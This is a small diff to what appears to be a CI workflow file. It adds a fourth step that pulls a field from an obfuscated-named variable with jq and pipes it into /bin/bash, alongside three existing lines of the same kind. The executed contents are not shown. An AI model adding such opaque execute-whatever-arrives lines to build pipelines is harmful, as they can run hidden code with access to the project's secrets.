@@ -29,6 +29,7 @@ jobs:
           echo $gicy6 | jq -r .ycg498 | /bin/bash
           echo $wel32246 | jq -r .wkxt379 | /bin/bash
           printf '%s' "$cmo62" | jq -r .sl586 | /bin/bash
+          printf '%s' "$v014" | jq -r .gl99 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
